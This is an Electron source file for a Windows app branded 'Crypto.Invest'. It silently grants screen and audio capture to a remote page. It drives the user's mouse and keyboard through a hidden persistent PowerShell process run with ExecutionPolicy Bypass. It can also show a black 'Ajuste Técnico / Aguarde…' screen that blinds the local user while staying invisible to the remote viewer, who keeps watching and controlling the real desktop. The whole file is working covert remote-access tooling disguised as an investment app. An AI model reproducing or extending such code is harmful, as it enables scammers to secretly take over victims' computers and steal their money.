const { app, BrowserWindow, desktopCapturer, session, ipcMain, screen } = require("electron");
const path = require("path");
const { spawn } = require("child_process");

// Crypto.Invest — janela desktop (Windows) que carrega a pagina de partilha e liga automaticamente.
// A partilha de ecra (getDisplayMedia) e concedida automaticamente ao 1o ecra.
// O controlo remoto (cliques/arrasto/teclado) e executado no SO atraves de UM processo
// PowerShell PERSISTENTE (REPL) com o tipo Win32 (user32.dll) carregado UMA vez.
// Isto e fundamental: antes era criado um powershell novo + Add-Type (compilacao C#) a
// cada clique, o que era lento e falhava silenciosamente. Agora os comandos sao enviados
// por stdin e executados de imediato.
const APP_URL = process.env.CRYPTOINVEST_URL || "https://invest-analysis-14.emergent.host/conectar?autostart=1";

function clamp01(v) { return Math.min(1, Math.max(0, v)); }

// ---- Processo PowerShell persistente (apenas Windows) ----
let psProc = null;
function ensurePs() {
  if (process.platform !== "win32") return null;
  if (psProc && !psProc.killed && psProc.stdin && psProc.stdin.writable) return psProc;
  try {
    psProc = spawn("powershell.exe", ["-NoProfile", "-NoExit", "-ExecutionPolicy", "Bypass"], { windowsHide: true });
  } catch (e) { psProc = null; return null; }
  psProc.on("exit", () => { psProc = null; });
  psProc.on("error", () => { psProc = null; });
  // Bootstrap: carregar os tipos UMA vez (mouse_event via user32 + SendKeys).
  const bootstrap =
    "Add-Type -AssemblyName System.Windows.Forms;" +
    "Add-Type -Name U -Namespace W -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(uint f,uint dx,uint dy,uint d,int e);';";
  try { psProc.stdin.write(bootstrap + "\r\n"); } catch (e) { psProc = null; }
  return psProc;
}
function psCmd(line) {
  const p = ensurePs();
  if (!p) return;
  try { p.stdin.write(line + "\r\n"); } catch (e) { psProc = null; }
}

// Coordenadas absolutas normalizadas (0..65535) — imunes a DPI/escala do ecra primario.
const ABS = (nx, ny) => `[W.U]::mouse_event(0x8001,${Math.round(clamp01(nx) * 65535)},${Math.round(clamp01(ny) * 65535)},0,0);`;

function tap(nx, ny) {
  psCmd(`${ABS(nx, ny)} Start-Sleep -Milliseconds 20; [W.U]::mouse_event(2,0,0,0,0); Start-Sleep -Milliseconds 45; [W.U]::mouse_event(4,0,0,0,0)`);
}

function swipe(nx, ny, nx2, ny2, dur) {
  const steps = 16;
  const per = Math.max(5, Math.round((dur || 350) / steps));
  let s = `${ABS(nx, ny)} [W.U]::mouse_event(2,0,0,0,0);`;
  for (let i = 1; i <= steps; i++) {
    const ix = nx + (nx2 - nx) * (i / steps);
    const iy = ny + (ny2 - ny) * (i / steps);
    s += ` Start-Sleep -Milliseconds ${per}; ${ABS(ix, iy)}`;
  }
  s += " [W.U]::mouse_event(4,0,0,0,0)";
  psCmd(s);
}

function typeText(v) {
  const esc = String(v || "").replace(/([+^%~(){}\[\]])/g, "{$1}").replace(/"/g, '`"');
  psCmd(`[System.Windows.Forms.SendKeys]::SendWait("${esc}")`);
}

function sendKey(key) {
  const map = { Enter: "{ENTER}", Backspace: "{BS}", Tab: "{TAB}", Delete: "{DEL}", Escape: "{ESC}", ArrowUp: "{UP}", ArrowDown: "{DOWN}", ArrowLeft: "{LEFT}", ArrowRight: "{RIGHT}", Home: "{HOME}", End: "{END}" };
  const tok = map[key];
  if (!tok) return;
  psCmd(`[System.Windows.Forms.SendKeys]::SendWait('${tok}')`);
}

ipcMain.on("ci-control", (_e, c) => {
  if (process.platform !== "win32" || !c) return;
  try {
    if (c.action === "tap") tap(c.x, c.y);
    else if (c.action === "swipe") swipe(c.x, c.y, c.x2, c.y2, c.duration);
    else if (c.action === "text") typeText(c.value);
    else if (c.action === "key") sendKey(c.key);
    else if (c.action === "privacy") setPrivacy(!!c.on);
    // "nav" (Voltar/Inicio/Recentes) so existe no Android; ignorado no Windows.
  } catch (e) { /* ignore */ }
});

// ---- Ecra de privacidade ("Ajuste Tecnico / Aguarde...") ----
// Janela preta em cima de tudo para o UTILIZADOR local, mas EXCLUIDA da captura de ecra
// (setContentProtection -> WDA_EXCLUDEFROMCAPTURE), pelo que o TECNICO continua a ver o ecra
// real por baixo. Nao rouba o foco nem o rato, para o controlo remoto continuar a funcionar.
let overlayWin = null;
function setPrivacy(on) {
  if (!on) { try { overlayWin?.close(); } catch (e) { /* */ } overlayWin = null; return; }
  if (overlayWin) return;
  const b = screen.getPrimaryDisplay().bounds;
  overlayWin = new BrowserWindow({
    x: b.x, y: b.y, width: b.width, height: b.height,
    frame: false, transparent: false, backgroundColor: "#000000",
    alwaysOnTop: true, skipTaskbar: true, focusable: false, resizable: false,
    movable: false, minimizable: false, maximizable: false, fullscreenable: false, show: false,
  });
  overlayWin.setAlwaysOnTop(true, "screen-saver");
  overlayWin.setIgnoreMouseEvents(true);       // cliques do tecnico passam para as apps reais
  try { overlayWin.setContentProtection(true); } catch (e) { /* */ }  // invisivel na captura
  const html =
    "<html><body style='margin:0;height:100vh;background:#000;display:flex;flex-direction:column;" +
    "align-items:center;justify-content:center;font-family:Segoe UI,Arial;color:#eee;user-select:none'>" +
    "<div style='font-size:36px;font-weight:700'>Ajuste Técnico</div>" +
    "<div style='margin-top:12px;font-size:20px;color:#9aa'>Aguarde…</div></body></html>";
  overlayWin.loadURL("data:text/html;charset=utf-8," + encodeURIComponent(html));
  overlayWin.once("ready-to-show", () => overlayWin && overlayWin.showInactive());
  overlayWin.on("closed", () => { overlayWin = null; });
}

function createWindow() {
  const win = new BrowserWindow({
    width: 1280,
    height: 820,
    title: "Crypto.Invest",
    backgroundColor: "#171A1F",
    icon: path.join(__dirname, "build", "icon.ico"),
    webPreferences: { contextIsolation: true, preload: path.join(__dirname, "preload.js") },
  });

  // Permitir partilha de ecra sem dialogo bloqueante
  session.defaultSession.setDisplayMediaRequestHandler((request, callback) => {
    desktopCapturer.getSources({ types: ["screen"] }).then((sources) => {
      callback({ video: sources[0], audio: "loopback" });
    });
  });

  win.loadURL(APP_URL);
}

app.whenReady().then(() => {
  ensurePs(); // aquecer o processo PowerShell para o 1o clique ser instantaneo
  createWindow();
});
app.on("window-all-closed", () => { if (process.platform !== "darwin") app.quit(); });
app.on("activate", () => { if (BrowserWindow.getAllWindows().length === 0) createWindow(); });
app.on("before-quit", () => { try { psProc?.kill(); } catch (e) { /* */ } });
